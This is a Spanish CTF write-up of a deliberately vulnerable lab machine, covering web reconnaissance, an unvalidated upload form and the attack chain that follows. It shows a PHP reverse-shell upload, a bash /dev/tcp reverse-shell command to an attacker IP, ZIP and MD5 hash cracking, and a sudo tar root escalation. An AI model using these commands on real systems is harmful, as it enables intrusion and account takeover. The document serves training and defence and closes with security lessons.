# Uploader

**Plataforma:** The Hackers Labs
**URL:** https://labs.thehackerslabs.com/machine/127
**Dificultad:** Fácil / Principiante
**OS:** Linux
**Fecha:** 21/07/2026

## 0. Resumen

Máquina Linux fácil que gira alrededor de un panel de subida de archivos sin validación real del lado del servidor.

El camino de explotación combina:
- Bypass de un formulario de subida de archivos (arbitrary file upload) para lograr RCE
- Post-explotación: localización de un ZIP oculto con credenciales cifradas
- Cracking en dos capas (contraseña del ZIP + hash MD5 filtrado dentro del ZIP)
- Escalada a root abusando de una regla `sudo` mal configurada sobre `tar` (GTFOBins)

## 1. Reconocimiento

### Nmap

```bash
nmap -p- --open -sCV -Pn -n --min-rate 5000 <IP> -oA uploader
```

| Opción | Función |
|---|---|
| `-p-` | Escanea todos los puertos (65535) |
| `--open` | Muestra únicamente puertos abiertos |
| `-sCV` | Scripts básicos + detección de versión |
| `-Pn` | Omite descubrimiento de host |
| `-n` | Sin resolución de DNS |
| `--min-rate` | Acelera el escaneo a 5000 paquetes/s |
| `-oA` | Guarda salida en todos los formatos |

**Resultado:** únicamente el puerto **80/TCP** (HTTP) queda expuesto. No hay SSH accesible desde el exterior en esta fase, así que todo el vector de entrada tiene que pasar por la web.

## 2. Enumeración WEB

Al acceder a la web nos encontramos con la landing page del "Uploader" y un enlace/botón que lleva a un panel de subida de archivos (`upload.php`).

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

Directorio relevante localizado: `/uploads/` → es donde el backend guarda (y sirve públicamente) todo lo que se sube desde `upload.php`. Esto es la primera señal de alarma: si el servidor no valida qué se sube y además lo deja accesible por HTTP, cualquier archivo ejecutable subido ahí se convierte en RCE.

## 3. Explotación — Arbitrary File Upload

### 3.1 Prueba del formulario

El formulario de `upload.php` no filtra por extensión ni por tipo MIME real del archivo (solo comprueba, como mucho, el `Content-Type` que manda el cliente, que es totalmente falsificable). Esto permite subir directamente un archivo `.php`.

### 3.2 Subida de la webshell

Usamos la reverse shell clásica de pentestmonkey:

```bash
curl -F "file=@shell.php" http://<IP>/upload.php
```

El servidor confirma la subida y nos indica (o inferimos por el patrón `/uploads/`) la ruta donde ha quedado guardado el archivo, normalmente dentro de un subdirectorio con nombre aleatorio:

```
http://<IP>/uploads/<carpeta_random>/shell.php
```

### 3.3 Ejecución de comandos / reverse shell

Antes de invocar el archivo, ponemos el listener:

```bash
nc -lvnp 4444
```

Y disparamos la ejecución visitando la ruta de la shell subida, forzando la conexión reversa:

```bash
curl "http://<IP>/uploads/<carpeta_random>/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/<IP_ATACANTE>/4444%200%3E%261%22"
```

→ Recibimos la shell como el usuario de servicio web (www-data o similar).

### 3.4 Mejorar la shell (TTY)

```bash
SHELL=/bin/bash script -q /dev/null
^Z
stty raw -echo && fg
reset
export TERM=xterm
```

## 4. Post-explotación — Localizando el ZIP

Enumerando `/home`, aparece un archivo `Readme.txt` y un directorio de otro usuario al que no tenemos acceso directo. El texto del Readme apunta (directa o indirectamente) a la existencia de un archivo comprimido con material sensible.

Buscamos ZIPs en todo el sistema:

```bash
find / -type f -name "*.zip" 2>/dev/null
```

**Resultado:** `/srv/secret/File.zip`

Nos lo traemos a la máquina atacante (por ejemplo, sirviéndolo con `python3 -m http.server` desde la víctima y descargándolo con `wget`/`curl`).

### 4.1 Intento de descompresión — error de compatibilidad

Al intentar descomprimirlo con `unzip` normal:

```bash
unzip File.zip
```

```
Archive:  File.zip
   skipping: Credentials/Credentials.txt  need PK compat. v5.1 (can do v4.6)
  creating: Credentials/
```

Esto ocurre porque el ZIP usa cifrado **AES** (especificación PKZIP 5.1+), que el `unzip` clásico de Info-ZIP no soporta (solo entiende hasta la 4.6, es decir, el cifrado ZipCrypto tradicional). Solución: usar `7z`, que sí soporta AES:

```bash
sudo apt install p7zip-full
7z x File.zip
```

Al intentarlo, pide contraseña — el ZIP está protegido.

## 5. Cracking — Doble capa

### 5.1 Contraseña del ZIP

```bash
zip2john File.zip > hash_zip.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash_zip.txt
```

`john` recupera la contraseña del ZIP contra `rockyou.txt`. Con ella conseguimos extraer `Credentials/Credentials.txt`.

### 5.2 El contenido no es texto plano

Dentro de `Credentials.txt` no aparece una contraseña legible directamente, sino un **hash MD5** asociado al usuario `operatorx`. Probamos primero a crackearlo con `john`:

```bash
echo "<hash_md5>" > hash_md5.txt
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash_md5.txt
```

Si `rockyou.txt` no lo resuelve directamente, un atajo rápido y muy habitual en este tipo de máquinas es consultar el hash contra una base de datos de MD5 precomputados como **CrackStation** — dado que MD5 sin sal es trivialmente reversible si la contraseña original ya está indexada en algún diccionario público.

→ Obtenemos la contraseña en texto plano para `operatorx`.

## 6. Movimiento lateral — su operatorx

```bash
su operatorx
```

Con las credenciales correctas, migramos al usuario `operatorx` y capturamos la primera flag:

```bash
cat /home/operatorx/user.txt
```

```
4a8b1c3d9e2f7a6b5c8d3e1f2a7b6c9d
```

## 7. Escalada de privilegios — sudo + tar (GTFOBins)

### 7.1 Enumeración de privilegios

```bash
sudo -l
```

**Resultado:** `operatorx` puede ejecutar el binario `/usr/bin/tar` como `root` sin contraseña.

### 7.2 Abuso de tar vía checkpoint

`tar` soporta la opción `--checkpoint-action`, que permite ejecutar un comando arbitrario durante el proceso de compresión/checkpoint. Al correr con privilegios de `sudo`, ese comando se ejecuta como `root`:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

→ Obtenemos una shell como `root`.

### 7.3 Flag final

```bash
cat /root/root.txt
```

```
e1f9c2e8a1d8477f9b3f6cd298f9f3bd
```

## 8. Lecciones aprendidas

- **Nunca confiar en la validación de subida de archivos del lado del cliente.** Cualquier formulario de upload debe validar la extensión, el tipo MIME real (magic bytes) y, sobre todo, no debe permitir la ejecución de archivos subidos desde el propio directorio público. Servir `/uploads/` con permisos de ejecución PHP es el fallo raíz de toda la cadena.
- **Un ZIP protegido no es un control de seguridad robusto por sí mismo**, especialmente si la contraseña procede de un diccionario común (`rockyou.txt`) o si dentro se guardan hashes sin salt (MD5), que son crackeables casi instantáneamente vía rainbow tables/CrackStation.
- **Auditar siempre las reglas de `sudo`** (`sudo -l`) tras cualquier acceso a un usuario intermedio. Binarios legítimos como `tar`, `find`, `vim`, etc. pueden convertirse en una puerta directa a root si se permiten sin restricción de argumentos — consultar siempre [GTFOBins](https://gtfobins.github.io/) ante cualquier binario permitido por sudo.
